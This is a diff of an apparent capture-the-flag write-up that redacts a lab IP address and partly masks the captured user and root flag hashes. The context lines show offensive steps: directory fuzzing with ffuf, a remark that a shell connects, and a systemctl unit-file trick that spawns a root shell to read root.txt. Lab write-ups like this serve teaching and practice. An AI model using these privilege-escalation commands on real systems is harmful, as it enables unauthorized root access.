@@ -12,7 +12,7 @@ We notice that **HTTP** is open on port **3333**. In the browser, we will enter:
 
 We will try to explore the different possible paths: </br>
 ```bash
-ffuf -u "http://10.129.185.32:3333/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "User-Agent: Firefox" -fc 403
+ffuf -u "http://[ip]:3333/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "User-Agent: Firefox" -fc 403
 ```
 </br>
 
@@ -52,7 +52,7 @@ on our machine and access the file on the page by entering ```http:[ip]:3333/int
 </br>
 The shell connects and we have the user.txt file. </br>
 ```bash
-$ cat user.txt 8bd7992fbe8a6ad22a63361004cfcedb 
+$ cat user.txt 8bd7992fbe8**********61004cfcedb 
 ```
 </br>
 
@@ -81,7 +81,7 @@ $ systemctl link $TF
 $ systemctl enable --now $TF
 $ /tmp/sh -p
 /# cat /root/root.txt
-/#a58ff8579f0a9270368d33a9966c7fd5
+/#a58ff8579f**********33a9966c7fd5
 ```
 
 
